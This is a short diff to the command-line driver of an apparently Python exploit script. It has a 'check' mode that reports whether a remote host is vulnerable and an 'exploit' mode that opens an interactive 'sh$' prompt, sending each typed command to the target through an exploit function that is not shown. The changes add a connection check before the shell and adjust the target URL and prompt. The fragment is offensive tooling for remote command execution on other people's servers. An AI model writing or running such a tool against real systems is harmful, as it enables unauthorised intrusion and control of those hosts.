@@ -53,16 +53,20 @@ if __name__ == '__main__':
     else:
         print("[+] Connecting !")
         opt =  sys.argv[1].lower()
-        target = sys.argv[2]
+        target = sys.argv[2] + '/'
         if opt == 'check':
             if (check(target)):
                 print("[+] The remote host is vulnerable!")
             else:
                 print("[-] The remote host is NOT vulnerable!")
         elif opt == 'exploit':
+            if (check(target)):
+                print("[+] Connected Successfully!")
+            else:
+                print("[-] Warning: Error while connecting o the remote target")
             cmd = ''
             while(True):
-                cmd = input('$ ').lower()
+                cmd = input('sh$ ').lower()
                 if (cmd == 'exit'):
                     exit(0)
                 print(exploit(target, cmd))
